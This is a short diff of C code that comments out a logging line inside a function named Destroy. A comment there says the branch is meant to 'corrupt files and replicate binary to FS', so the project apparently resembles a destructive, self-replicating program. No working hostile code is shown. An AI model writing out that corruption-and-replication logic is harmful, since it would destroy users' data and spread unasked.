@@ -43,7 +43,7 @@ void Destroy(FileList *start)
 		
 		else
 		{
-			fprintf(stdout, BLUE"[+] Regular"RESET" : %s\n", ptr->name);
+			//fprintf(stdout, BLUE"[+] Regular"RESET" : %s\n", ptr->name);
 			// corrupt files and replicate binary to FS
 		}
 
